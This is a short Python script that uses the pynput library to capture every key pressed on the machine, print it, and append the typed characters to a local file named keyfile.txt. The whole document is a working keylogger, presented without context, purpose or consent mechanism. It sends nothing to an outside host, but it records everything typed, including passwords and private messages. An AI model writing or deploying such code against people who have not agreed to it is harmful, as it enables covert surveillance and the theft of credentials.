from pynput import keyboard

def key_pressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logKey:
        try:
            char=key.char
            logKey.write(char)
        except:
            print('there was an error getting the logs')



if __name__=="__main__":

    listener= keyboard.Listener(on_press=key_pressed)
    listener.start()
    input()